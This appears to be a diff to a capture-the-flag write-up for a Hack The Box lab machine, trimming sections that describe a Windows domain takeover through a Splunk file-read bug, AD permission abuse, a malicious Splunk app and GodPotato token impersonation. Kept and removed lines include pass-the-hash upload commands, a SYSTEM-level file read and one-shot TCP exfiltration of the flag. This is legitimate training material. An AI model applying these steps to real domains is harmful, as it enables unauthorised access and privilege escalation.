@@ -790,16 +790,9 @@ Info: Upload successful!
 nxc winrm dc01.haze.htb -u edward.martin -H <EDWARD_NTLM_HASH> -d haze.htb \
   --put-file /tmp/haze/bin/GodPotato-NET4.exe 'C:\Users\edward.martin\Documents\GodPotato-NET4.exe'
 ```
-
-From the **alexander.green** reverse shell (`haze\alexander.green`), GodPotato must run as that user — Edward has no `SeImpersonatePrivilege`.
-
-### Option A — inline root read (no second listener)
-
 ```powershell
 C:\Users\edward.martin\Documents\GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
 ```
-
-### Option B — Splunk app one-shot exfil (what we used)
 
 Bundle GodPotato in a `.spl` modular input; on run it writes the flag and TCP-pushes to your listener. Connection closes after one send — that is expected.
 
@@ -817,56 +810,6 @@ nxc winrm dc01.haze.htb -u edward.martin -H <EDWARD_NTLM_HASH> -d haze.htb \
 # user: <REDACTED_USER_FLAG>
 ```
 
----
-
-## Root flag location
-
-| Artifact | Path |
-|----------|------|
-| **user.txt** | `C:\Users\edward.martin\Desktop\user.txt` |
-| **root.txt** | `C:\Users\Administrator\Desktop\root.txt` |
-
-Edward can read his own Desktop; only **SYSTEM** / Administrator can read `Administrator\Desktop\root.txt` directly.
-
----
-
-## Full chain (publish summary)
-
-```text
-CVE-2024-36991 (Splunk LFI) → splunk.secret + authentication.conf
-  → splunksecrets → LDAP password → spray → mark.adams
-  → gMSA WriteProperty → Haze-IT-Backup$ hash (LDAPS :636)
-  → WriteOwner Support_Services → dacledit WriteMembers → bloodyad
-  → certipy shadow → edward.martin
-  → Backup_Reviewers → splunk_backup zip → $1$ decrypt
-  → Splunk web admin → malicious .spl → alexander.green
-  → SeImpersonatePrivilege → GodPotato → root.txt
-```
-
----
-
-## Scars (do not repeat)
-
-| # | Trap | Fix |
-|---|------|-----|
-| 1 | `owneredit` then pause — owner reverts to Domain Admins | Run **write → read → dacledit → bloodyad → certipy** in one session |
-| 2 | `SUPPORT_SERVICES` vs `Support_Services` | Use exact **`Support_Services`** for `owneredit` |
-| 3 | SMB `C$` pull as Edward | **WinRM** or TCP exfil — `C$` needs admin share |
-| 4 | evil-winrm `download` on 27 MB zip | **TCP `CopyTo` + `nc`** |
-| 5 | Spray backup password at `alexander.green` AD | Decrypt unlocks **Splunk local `admin`** on `:8000`, not AD login |
-| 6 | GodPotato as Edward | Only **Splunk service user** has `SeImpersonate` |
-| 7 | Root `.spl` “rev shell” drops instantly | One-shot exfil by design — use **interactive** `.spl` on `:9002` if you need a shell |
-
----
-
-## MITRE (high level)
-
-| Phase | Techniques |
-|-------|------------|
-| Foothold | T1190 Exploit Public-Facing Application (Splunk LFI) |
-| Cred access | T1552.001 Credentials in Files |
-| AD privesc | T1222.001 DACL abuse · T1558.004 Shadow credentials · gMSA abuse |
-| Privesc | T1055 Token impersonation (GodPotato / SeImpersonate) |
 
 ---
 
